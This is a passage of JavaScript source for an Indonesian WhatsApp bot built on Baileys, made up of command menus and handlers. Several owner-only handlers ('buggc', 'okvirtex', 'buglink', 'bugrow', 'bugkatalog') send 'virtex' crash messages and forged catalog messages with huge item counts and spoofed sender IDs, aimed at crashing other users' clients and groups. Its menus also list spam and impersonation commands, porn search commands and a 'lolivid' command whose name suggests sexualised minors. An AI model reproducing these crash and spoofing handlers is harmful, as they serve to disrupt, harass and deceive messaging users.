> โฌก ${prefix}kisahnabi (nama nabi)
> โฌก ${prefix}listsurah
> โฌก ${prefix} alquran
> โฌก ${prefix}alquranaudio
> โฌก ${prefix}doaharian 
> โฌก ${prefix}ayatkursi
> โฌก ${prefix}bacaanshalat
> โฌก ${prefix}tahlil
> โฌก ${prefix}wirid
> โฌก ${prefix}asmaulhusna
   

 โฌฃ *๐๐๐๐๐ ๐๐๐๐* ใท๏ธ
> โฌก ${prefix}upswteks
> โฌก ${prefix}upswlokasi
> โฌก ${prefix}upswsticker
> โฌก ${prefix}upswimage
> โฌก ${prefix}upswvideo
> โฌก ${prefix}upswgif

  โฌฃ *๐๐๐๐๐ WIBU* ใท๏ธ
> โฌก ${prefix}animeindo (text)
 > โฌก ${prefix}samehadaku <text>
> โฌก ${prefix}kusonime (text)

  โฌฃ *๐๐๐๐๐ RANDOM TEXT* ใท๏ธ
 > โฌก ${prefix}indbeasiswa
> โฌก ${prefix}kodepos (query)
> โฌก ${prefix}covidindo
> โฌก ${prefix}covidglobal
> โฌก ${prefix}faktaunik
> โฌก ${prefix}katabijak
> โฌก ${prefix}pantun
> โฌก ${prefix}bucin
> โฌก ${prefix}randomnama
> โฌก ${prefix}newsinfo
> โฌก ${prefix}herolist
> โฌก ${prefix}herodetail
> โฌก ${prefix}otakudesusearch
> โฌก ${prefix}kusuonimesearch
> โฌก ${prefix}listdaerah
> โฌก ${prefix}alay
> โฌก ${prefix}fml
> โฌก ${prefix}alay
> โฌก ${prefix}chord
> โฌก ${prefix}katacinta
> โฌก ${prefix}spamcall
> โฌก ${prefix}cogan
> โฌก ${prefix}beritahoax
> โฌก ${prefix}mutual
> โฌก ${prefix}next
> โฌก ${prefix}chord
> โฌก ${prefix}quotesyt
> โฌก ${prefix}cnn 
> โฌก ${prefix}kompastv
 > โฌก ${prefix}infoloker
 > โฌก ${prefix}tokohindo
 > โฌก ${prefix}mostviewfilm
> โฌก ${prefix}trendingtwitter
> โฌก ${prefix}katailham
> โฌก ${prefix}renungan
> โฌก ${prefix}tongue
> โฌก ${prefix}fake
> โฌก ${prefix}Twich
> โฌก ${prefix}hbd
> โฌก ${prefix}cersex
> โฌก ${prefix}jadwaltvnow
> โฌก ${prefix}hoax2
> โฌก ${prefix}style (text)
> โฌก ${prefix}pastebin (text)
> โฌก ${prefix}corona

  โฌฃ *๐๐๐๐๐ SEARCH* ใท๏ธ
> โฌก ${prefix}lk21 (query)
> โฌก ${prefix}wattpadsearch
> โฌก ${prefix}drakorongoing
> โฌก ${prefix}jadwalbola
> โฌก ${prefix}jadwaltvnow
> โฌก ${prefix}hoax
> โฌก ${prefix}kbbi (query)
> โฌก  ${prefix}mlstalk (id)
> โฌก ${prefix}ggs
> โฌก ${prefix}genshin
> โฌก ${prefix}meme
> โฌก ${prefix}wiki
> โฌก ${prefix}wangy <text>
> โฌก ${prefix}lazimedia <text>
 > โฌก ${prefix}googlesearch2 (text)
 > โฌก ${prefix}palingmurah (text)
> โฌก ${prefix}sfilesearch (text)
> โฌก ${prefix}jooxplay2
> โฌก ${prefix}kodepos2 (text) 
> โฌก ${prefix}ytstalk (channel)
> โฌก ${prefix}happymod <text>
> โฌก ${prefix}film <text>
> โฌก ${prefix}ytplaylist <text>
> โฌก ${prefix}ytchannel <text>

  โฌฃ *๐๐๐๐๐ RANDOM TAG* ใท๏ธ
> โฌก  ${prefix}rate
> โฌก  ${prefix}bisakah
> โฌก  ${prefix}kapankah
> โฌก  ${prefix}apakah
> โฌก ${prefix}tempat
> โฌก ${prefix}cuaca
> โฌก ${prefix}cantik
> โฌก ${prefix}ganteng
> โฌก ${prefix}babi
> โฌก ${prefix}beban
> โฌก ${prefix}jadian
> โฌก ${prefix}cekwatak

 โฌฃ *๐๐๐๐๐ ๐๐๐* ใท๏ธ
> โฌก ${prefix}fitnah
> โฌก ${prefix}fitnahpc
> โฌก ${prefix}kontak 0|p
> โฌก ${prefix}lolivid
> โฌก ${prefix}suit
> โฌก ${prefix}toxic
> โฌก ${prefix}flock
> โฌก ${prefix}pantun
> โฌก ${prefix}dadu
> โฌก ${prefix}asupan
> โฌก ${prefix}viewonce
> โฌก ${prefix}detikvn number
> โฌก ${prefix}detikvideo number
 
  โฌฃ *๐๐๐๐๐ ๐๐๐๐* ใท๏ธ
> โฌก ${prefix}xs [ query ]
> โฌก ${prefix}xv [ link ]
> โฌก ${prefix}xhamsterseaech [ query ]
> โฌก ${prefix}xhamster [ link ]
> โฌก ${prefix}xnxxsearch [ query ]
> โฌก ${prefix}xnxx [ link ]
> โฌก ${prefix}xnxxsearch [ query ]
> โฌก ${prefix}nekopoi [ link ]
> โฌก ${prefix}nekopoisearch [ query ]
> โฌก ${prefix}randombokep 
> โฌก ${prefix}jav (text)
> โฌก ${prefix}phsearch (text)

 โฌฃ *๐๐๐๐๐ ๐๐๐๐ ANIME* ใท๏ธ
> โฌก ${prefix}yuri
> โฌก ${prefix}hentai
> โฌก ${prefix}anal
> โฌก ${prefix}eroneko
> โฌก ${prefix}lesbian
> โฌก ${prefix}kitsune
> โฌก ${prefix}bj
> โฌก ${prefix}pussy
> โฌก ${prefix}wallpaper
> โฌก ${prefix}neko2
> โฌก ${prefix}baka
> โฌก ${prefix}slap
> โฌก ${prefix}poke
> โฌก ${prefix}keta
> โฌก ${prefix}awoo
> โฌก ${prefix}blowjob
> โฌก ${prefix}megumin
> โฌก ${prefix}neko
> โฌก ${prefix}trapnime

๐ก๐ผ๐๐ฒ : ๐ฅ๐๐๐๐ ๐ฃ๐๐๐๐? ๐ฌ๐บ๐๐๐๐ ๐ฒ๐บ๐๐บ ๐ญ๐พ๐๐ป๐๐พ
Baru Belajar Bikin Bot ใ๏ธ
 
๐ฝ๐ช๐ ๐๐ฃ ๐๐ง๐ค๐๐๐ข๐ข๐๐ง ๐ฝ๐๐ฃ๐โน๏ธ
`
sendButLocation(from, `${menu}`,`๐ฝ๐ค๐ฉ ๐ฝ๐ฎ @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}command`,buttonText:{displayText:'๐๐๐ฃ๐ช ใท๏ธ'},type:1},{buttonId:`${prefix}credit`,buttonText:{displayText:'๐๐๐๐ฃ๐ ๐จ ๐๐คโป๏ธ'},type:1},{buttonId:`${prefix}script`,buttonText:{displayText:'๐๐๐ง๐๐ฅ๐ฉ ใท๏ธ'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'credit':
case 'Credit':
   dtod = '6281314050985'
   dtod1 = '6285751056816'
   dtod2 = '6285697725326'
   dtod3 = '629626029135'
   dtod4 ='0'
   var yez = `
   [ ๐ถ๐๐๐๐๐ก๐  ๐ต๐ฆ ] :
   
 ๐น : wa.me/${dtod1.split("@")[0]}
 ๐น : wa.me/${dtod.split('@')[0]}
 ๐น : wa.me/${dtod2.split('@')[0]}
 ๐น : wa.me/${dtod3.split('@')[0]}
 ๐น : wa.me/${dtod4.split('@')[0]}
 `
     credit = itsmevall.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 1000, "message": `${yez}`, "footerText": "hehe", "thumbnail": iye, "surface": 'CATALOG'}}, {quoted: mek})
            itsmevall.relayWAMessage(credit)
        break
case 'suit':
case 'Suit':
              if (!q) return reply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
              const userspilih = q
              if (!userspilih.match(/batu|gunting|kertas/)) return reply(`Pilih batu, kertas, gunting`)
              var computer = Math.random();
              if (computer < 0.34 ) {
              computer = 'batu';
              } else if( computer >= 0.34 && computer < 0.67) {
              computer = 'gunting';
              } else {
              computer = 'kertas';
}
              if ( userspilih == computer ) {
              reply(`Pertandingan Seri!`)
              } else if ( userspilih == 'batu' ) {
              if( computer == 'gunting' ) {
              reply(`Kamu memilih Batu dan bot Gunting\nKamu menang!`)
              } else {
              reply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
}
              } else if ( userspilih == 'gunting' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
              } else {
              reply(`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)
}
              } else if ( userspilih == 'kertas' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Kertas dan bot Batu\nKamu menang!`)
              } else {
              reply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
}
}
              break
case 'loliv':
       case 'lolivid':
       case 'lolivideo':
       case 'Loliv':
       case 'Lolivid':
       case 'Lolivideo':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
              reply(mess.wait)
              anu = await fetchText('https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt')
             .then(async (body) => {
              anu = body.split('\n')
              anu = anu[Math.floor(Math.random() * anu.length)]
              sendMediaURL(from, anu)
})
             .catch(async (err) => {
              console.error(err)
              reply(`${err}`)
})
              break
case 'bugreport':
case 'Bugreport':
              if (args.length < 1) return reply(`Ketik ${prefix}bugreport [fiturnya] [Error Nya Gimana]`) 
              teks = args.join(' ')
              reply('Terima Kasih Telah Melaporkan Bug Pada Owner, Jika Itu Sekedar Iseng Maka Akan Di Ban Oleh Bot!')
              itsmevall.sendMessage('629626029135@s.whatsapp.net',`*Bug Report:* ${teks}`, text)
              
              break
case 'restart':
case 'Restart':
             if (!isOwner) return 
             reply(mess.wait)
             exec(`node main`)
             reply('_Restarting Bot Success_')
break
case 'toxic':
case 'Toxic':
              Toxic().then(toxic => {
              reply (toxic)
})
              break
              case 'storyanime': case 'sanime':{
              if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
reply(mess.wait)
get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/anime/storyanime?apikey=${dapapi}`)
kodi = `*_CLICK NEXT UNTUK SELANJUTNYA_*`
   sendButVideo(from, kodi, `${watermark}`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `NEXT`,
            },
            type: 1,
          },
        ]);         
        }
                    break       
case 'quotesyt':
case 'Quotesyt':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
                reply(mess.wait)
                dapuhy = await getBuffer(`https://dapuhy-api.herokuapp.com/api/randomimage/quotesyt?apikey=${dapapi}`)
                itsmevall.sendMessage(from, dapuhy, image, {quoted: mek})        
                break    
case 'auu': // by itsmevall
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
       reply('Enggak Kak')
        sendButMessage(from, `Hai Kak ${pushname} ๐ค`, `Mau Jawab Apa?`, [
          {
            buttonId: `${prefix}oklah`,
            buttonText: {
              displayText: `kok gitu sih:)`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}apaan6`,
            buttonText: {
              displayText: `Dahlah`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}awokkk`,
            buttonText: {
              displayText: `end:/`,
            },
            type: 1,
          },
        ]);
        break;
case 'oklah':
reply(':v')
break
case 'apaan6':
reply('oke slur')
break
case 'awokkk':
reply('iyalah masa engga')
break

case 'isbaileys': 
case 'bail': 
case 'baileys':
case 'Isbaileys': 
case 'Bail': 
case 'Baileys':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
if (!mek.key.fromMe) return;
reply(`${mek.quoted.isBaileys}`)
break
case 'getcaption':
case 'Getcaption':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
if (!mek.key.fromMe) return;
try {
reply(`${mek.quoted.title}`)
} catch {
reply(`${mek.quoted.caption}`)
}
break
case 'iggw':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
  reply('https://instagram.com/k4t4sh1._')
break
   
case 'owner':
           case 'creator':
           case 'Owner':
           case 'Creator':
             
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
               sendKontak(from, `${owner}`, `${fakeyoi}`, 'Sibukk!!')
               await sleep(1000)
               haibg =`Hai Kak ${pushname}\nItu Ownerku, Mau tau soal apa ya?`
               buttons = [{buttonId: `${prefix}mygithub`,buttonText:{displayText: 'SC BOT'},type:1},{buttonId:`${prefix}iggw`,buttonText:{displayText:'INSTAGRAM'},type:1}]
               buttonsMessage = { contentText: `${haibg}`, footerText: `Created By ${fakeyoi} ๐น`, buttons: buttons, headerType: 1 }
               prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{})
               itsmevall.relayWAMessage(prep)
               break      
            
case 'f':
case 'lock':
case 'F':
case 'Lock':
 ikymemek = {
  "key": {
    "fromMe": false,
    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
  },
  "message": {
    "viewOnceMessage": {
      "message": {
        "imageMessage": {
          "url": "https://mmg.whatsapp.net/d/f/AjD3dQIM5hW3UkDfnnkice-eMcsMJJALEcgD9HnDGZEp.enc",
          "mimetype": "image/jpeg",
          "fileSha256": "aR3vWUsV9VZUiR+agYok8oM4UHiuhqEShMpQ6SgY9WM=",
          "fileLength": "675",
          "height": 41,
          "width": 52,
          "mediaKey": "6RDG8T+jOb0RfleWzLTclsaVn0EGRA/v78dnS+Y4S+o=",
          "fileEncSha256": "idNxqNtCaHRxuN+AX0uakPrBuiyvx84IksPUYMYgs7Y=",
          "directPath": "/v/t62.7118-24/13810909_985978368802545_7608967834334288292_n.enc?ccb=11-4&oh=359274a24041d97e91597ad1fb40e784&oe=61595B99",
          "mediaKeyTimestamp": "1630826390",
          "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACkANAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAApgAAAAAAAAAAAf/EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQEAAT8AK//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQIBAT8AT//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQMBAT8AT//Z",
          "viewOnce": true
        }
      }
    }
  },
  "messageTimestamp": "1630826389",
  "status": "SERVER_ACK",
  "mediaData": {
    "localPath": "/data/user/0/com.gbwhatsapp/files/ViewOnce/IMG-20210905-WA0047.jpg"
  }
}
itsmevall.sendMessage(from, { "degreesLatitude": '', "degreesLongitude": '', "jpegThumbnail": iye}, MessageType.location, {quoted: ikymemek})
           break
case 'mengyoi':
case 'Mengyoi':
if (!mek.key.fromMe) return;
sendBug(from)
break
case 'buggc':
case 'Buggc':
if (!mek.key.fromMe) return;
if (!q) return reply('Masukan ID Grupnya')
sendBug(args[0])
break
case 'okvirtex':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
katalog(`${ngazap(prefix)}`)
katalog(`${emoji2(prefix)}`)
katalog(`${virtex90(prefix)}`)
katalog(`${virtex2(prefix)}`)
katalog(`${virtex3(prefix)}`)
katalog(`${virtex4(prefix)}`)
katalog(`${virtex5(prefix)}`)
katalog(`${virtex6(prefix)}`)
katalog(`${virtex7(prefix)}`)
katalog(`${virtex8(prefix)}`)
katalog(`${virtex9(prefix)}`)
katalog(`${virtag(prefix)}`)
break
case 'buglink':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                 itsmevall.toggleDisappearingMessages(from, 0)
               itsmevall.sendMessage(from, virtex3(prefix), text, { quoted:ftrol, contextInfo :{text: '๐ฅ',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${virtex2(prefix)}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/3hrZZ6s/tsukasa.png",
                "thumbnail": fs.readFileSync(`./itsmevall.jpg`),
                "sourceUrl": "https://youtube.com/c/ItsMeVall"}}})
                break
        case 'bugbutton':
        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        itsmevall.toggleDisappearingMessages(from, 0)
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:'Yahahaha'},type:1}])
        itsmevall.toggleDisappearingMessages(from, 0)
break
case 'bugrow':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
itsmevall.toggleDisappearingMessages(from, 0)
 listMsg = {
 buttonText: 'LIST MENU',
 footerText: `${emoji2(prefix)}`,
 description: `${virtex6(prefix)}`,
 sections: [
                     {
                      "title": "CieKontol",
 rows: [
                          {
                              "title": "CieBug",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
itsmevall.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
itsmevall.toggleDisappearingMessages(from, 0)
break
case 'bugkatalog':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
itsmevall.toggleDisappearingMessages(from, 0)
 babi = (teks) => {
             res = itsmevall.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": iye, "surface": 'CATALOG' }}, {quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${virtex6(prefix)}`,
    orderTitle: `${emoji2(prefix)}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
             itsmevall.relayWAMessage(res)
        }
        babi(`${ngazap(prefix)}`)
        babi(`${virtag(prefix)}`)
        babi(`${virtex6(prefix)}`)
        babi(`${emoji2(prefix)}`)
        break
       
                           case 'bucinstick':
                case 'bucinsticker':{
         
                    var ano = await fetchText('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
                    var wifegerak = ano.split('\n')
                    var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
                    var isGif = wifegerakx.endsWith('.gif') ? true : false
                    if (!isGif) {
                    var ngebuff = await getBuffer(wifegerakx)
                    var media = getRandom('.png')
                    fs.writeFileSync(media, ngebuff)
                    await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                    if (error) return reply(mess.error.api)
									 itsmevall.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})
								
                                    fs.unlinkSync(media)	
									fs.unlinkSync(`./sticker/${sender}.webp`)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                    } else {
                     var ngebuff = await getBuffer(wifegerakx)
                 	let media = `./sticker/${sender}.gif`
                    fs.writeFileSync(media, ngebuff)
					reply(mess.wait)
                        await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(err)
								fs.unlinkSync(media)
								let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return reply(mess.error.api)
									 itsmevall.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})
									
                                    fs.unlinkSync(media)
									fs.unlinkSync(`./sticker/${sender}.webp`)
                                })
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                    }
                    }
                    break
              case 'dadu':
              case 'Dadu':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			itsmevall.sendMessage(from, damdu, sticker, {quoted: mek})
			break
 case 'owner3':
 case 'Owner3':
let ini_list = []
for (let i of nomorowner1) {
const vname = itsmevall.contacts[i] != undefined ? itsmevall.contacts[i].vname || itsmevall.contacts[i].notify : undefined
ini_list.push({
"displayName": 'ItsMeVall',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${itsmevall.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await itsmevall.sendMessage(from, {
"displayName": `${ini_list.length} kontak`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: mek })
itsmevall.sendMessage(from,'Ini Kontak Owner Ku',text,{quoted: mek})
break
case 'command':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
 listMsg = {
 buttonText: '๐๐๐ฆ๐ง ๐ ๐๐ก๐จ',
 footerText: 'Putra Ganzใท๏ธ',
 description: `Hai kak @${sender.split('@')[0]}, Silahkan pilih menu disini`,
 sections: [
                     {
                      "title": `${jam} - ${week} ${weton} - ${date}`,
 rows: [
                          {
                              "title": "Script",
                              "rowId": ""
                           },
                           {
                              "title": "Speed",
                              "rowId": ""
                           },
                           {
                              "title": "Status",
                              "rowId": ""
                           },
                           {
                              "title": "Creator",
                              "rowId": ""
                           },
                           {
                              "title": "Jadibot",
                              "rowId": ""
                           },
                           {
                              "title": "Runtime",
                              "rowId": ""
                           },
                           {
                              "title": "OwnerMenu",
                              "rowId": ""
                           },
                           {
                              "title": "MakerMenu",
                              "rowId": ""
                           },
                           {
                              "title": "GroupMenu",
                              "rowId": ""
                           },
                           {
                              "title": "OtherMenu",
                              "rowId": ""
                           },
                           {
                              "title": "DownloadMenu",
                              "rowId": "d"
                           },
                           {
                              "title": "UpswMenu",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
itsmevall.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]},quoted:ftrol})
break
case 'downloadmenu':
menu = `ใท๏ธ๐๐ฐ๐ธ๐ฏ๐ญ๐ฐ๐ข๐ฅ๐ฆ๐ณ ๐๐ฆ๐ฏ๐ถใท๏ธ
ใ${prefix}๐ฎ๐ฉ๐ข๐ฅ4 ๐ก๐๐ฃ๐ 

ใ${prefix}๐ฎ๐ฉ๐ข๐ฅ3 ๐ก๐๐ฃ๐ 

ใ${prefix}๐ฅ๐ก๐๐ฎ ๐ฆ๐ช๐๐ง๐ฎ

ใ${prefix}๐๐ฃ๐จ๐ฉ๐๐๐ง๐๐ข <๐ช๐ง๐ก>

ใ${prefix}๐ฉ๐ฌ๐๐ฉ๐ฉ๐๐ง <๐ช????>
`
sendButMessage(from, menu, `๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ`, [
          {
            buttonId: `${prefix}command`,
            buttonText: {
              displayText: `๐ฝ๐๐๐  ๐๐๐ฃ๐ช ใท๏ธ`,
            },
            type: 1,
          },]);
break
case 'groupmenu':
menu = `ใท๐๐ณ๐ฐ๐ถ๐ฑ ๐๐ฆ๐ฏ๐ถ๏ธใท๏ธ
ใ${prefix}grup [3 Button]

ใ${prefix}promote <reply chat member>

ใ${prefix}demote <reply chat member>

ใ${prefix}setdesc

ใ${prefix}nsfw 1/0

ใ${prefix}setname

ใ${prefix}kick <reply/tag member>

ใ${prefix}add <reply/tag member>

ใ${prefix}getbio <reply chat member>

ใ${prefix}getname <reply chat member>

ใ${prefix}reminder <msg/2s>

ใ${prefix}listonline

ใ${prefix}sider [reply chat bot]

ใ${prefix}antilink

ใ${prefix}tod 

ใ${prefix}tospam jumlah

ใ${prefix}antihidetag

ใ${prefix}antiviewonce

ใ${prefix}autojoin

ใ${prefix}antivirtex

ใ${prefix}kickarea
`
sendButMessage(from, menu, ` ๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ`, [
          {
            buttonId: `${prefix}command`,
            buttonText: {
              displayText: `โฌก BACK TO MENU `,
            },
            type: 1,
          },]);
break
case 'ownermenu':
menu = `ใท๏ธ๐๐ธ๐ฏ๐ฆ๐ณ ๐๐ฆ๐ฏ๐ถใท๏ธ
ใ${prefix}off

ใ${prefix}isbaileys

ใ${prefix}banchat

ใ${prefix}unbanchat

ใ${prefix}listbc

ใ${prefix}antidelete on|off

ใ${prefix}autoketik on| off

ใ${prefix}autoread gc on / gc off

ใ${prefix}autovn on / off

ใ${prefix}antical on | off

ใ${prefix}getcaption

ใ${prefix}bugkatalog

ใ${prefix}buggc [id grup]

ใ${prefix}okvirtex

ใ${prefix}on

ใ${prefix}status

ใ${prefix}setthumb

ใ${prefix}settarget

ใ${prefix}setfakeimg

ใ${prefix}setreply

ใ${prefix}hacked

ใ${prefix}setprefix

ใ${prefix}mode [2 Button self/public]

ใ${prefix}term <code>

ใ${prefix}eval <code>

ใ${prefix}colongsw [reply sw]
`
sendButMessage(from, menu, `๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ`, [
          {
            buttonId: `${prefix}command`,
            buttonText: {
              displayText: `โฌก BACK TO MENU `,
            },
            type: 1,
          },]);
break
case 'upswmenu':
menu = `ใท๏ธ๐๐ฑ๐ด๐ธ ๐๐ฆ๐ฏ๐ถใท๏ธ
ใ${prefix}upswteks teks

ใ${prefix}upswvideo

ใ${prefix}upswimage

ใ${prefix}upswvoice

ใ${prefix}upswsticker

ใ${prefix}upswlokasi
`
sendButMessage(from, menu, ` ๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ`, [
          {
            buttonId: `${prefix}command`,
            buttonText: {
              displayText: `โฌก BACK TO MENU `,
            },
            type: 1,
          },]);
break
case 'othermenu':
menu = `ใท๏ธ๐๐ต๐ฉ๐ฆ๐ณ ๐๐ฆ๐ฏ๐ถใท๏ธ
ใ${prefix}ping

ใ${prefix}inspect

ใ${prefix}join

ใ${prefix}dadu

ใ${prefix}bilangangka number

ใ${prefix}kalkulator

ใ${prefix}pantun

ใ${prefix}quote

ใ${prefix}nuliskanan teks

ใ${prefix}nuliskiri teks

ใ${prefix}foliokiri teks

ใ${prefix}foliokanan teks

ใ${prefix}ss link web

ใ${prefix}liriklagu <query>

ใ${prefix}artinama <name>

ใ${prefix}debug

ใ${prefix}loli 

ใ${prefix}debug2

ใ${prefix}infogempa

ใ${prefix}resepmasakan

ใ${prefix}chat 62|P

ใ${prefix}caripesan <query>

ใ${prefix}get url

ใ${prefix}githubstalk <query>

ใ${prefix}ytsearch <query>

ใ${prefix}igstalk <query>

ใ${prefix}tiktokstalk <query>

ใ${prefix}play <query>

ใ${prefix}video <query>

ใ${prefix}igstory <username>

ใ${prefix}twitter <link>

ใ${prefix}tiktok <link>

ใ${prefix}fb <link>

ใ${prefix}brainly <query>

ใ${prefix}image <query>

ใ${prefix}anime <random>

ใ${prefix}pinterest <query>

ใ${prefix}komiku <query>

ใ${prefix}lirik <query>

ใ${prefix}chara <query>

ใ${prefix}playstore <query>

ใ${prefix}otaku <query>
`
sendButMessage(from, menu, ` ๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ`, [
          {
            buttonId: `${prefix}command`,
            buttonText: {
              displayText: `โฌก BACK TO MENU `,
            },
            type: 1,
          },]);
break
case 'makermenu':
menu = `ใท๏ธ๐๐ข๐ฌ๐ฆ๐ณ ๐๐ฆ๐ฏ๐ถใท๏ธ
ใ${prefix}๐จ๐ฉ๐๐๐ ๐๐ง

ใ${prefix}๐จ๐ฌ๐ข <๐๐ช๐ฉ๐๐ค๐ง|๐ฅ๐๐๐ ๐ฃ๐๐ข๐>

ใ${prefix}๐ฉ๐๐ ๐ <๐๐ช๐ฉ๐๐ค๐ง|๐ฅ๐๐๐ ๐ฃ๐๐ข๐>

ใ${prefix}fdeface

ใ${prefix}attp teks

ใ${prefix}fancytext teks

ใ${prefix}emoji

ใ${prefix}halloween teks

ใ${prefix}vampire teks

ใ${prefix}codetxt teks

ใ${prefix}matrix teks

ใ${prefix}googletxt teks

ใ${prefix}spiderman teks

ใ${prefix}express

ใ${prefix}maker2d2 teks

ใ${prefix}maker2d3 teks

ใ${prefix}maker2d4 teks

ใ${prefix}maker3d teks

ใ${prefix}golden teks

ใ${prefix}flower teks

ใ${prefix}dance

ใ${prefix}wooden teks

ใ${prefix}burn teks

ใ${prefix}glow teks

ใ${prefix}summer teks

ใ${prefix}neon teks

ใ${prefix}coffeecup2 teks

ใ${prefix}coffeecup teks

ใ${prefix}battlefield teks|teks

ใ${prefix}googletxt2 teks

ใ${prefix}transformer teks

ใ${prefix}nulis teks

